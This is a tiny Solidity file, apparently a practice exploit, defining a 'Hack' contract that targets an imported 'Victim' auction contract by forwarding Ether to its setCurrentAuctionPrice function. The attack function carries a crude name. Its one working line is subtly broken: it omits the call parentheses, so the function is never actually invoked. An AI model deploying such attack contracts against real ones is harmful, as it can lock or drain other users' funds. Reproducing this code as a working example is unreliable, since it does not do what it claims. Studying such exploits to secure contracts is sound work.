// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;
import "./Victim.sol";

contract Hack {
    Victim victim;

    constructor(address _victim) {
        victim = Victim(_victim);
    }

    function attackThisWeakAssContract() public payable {
        victim.setCurrentAuctionPrice{value: msg.value};
    }
}
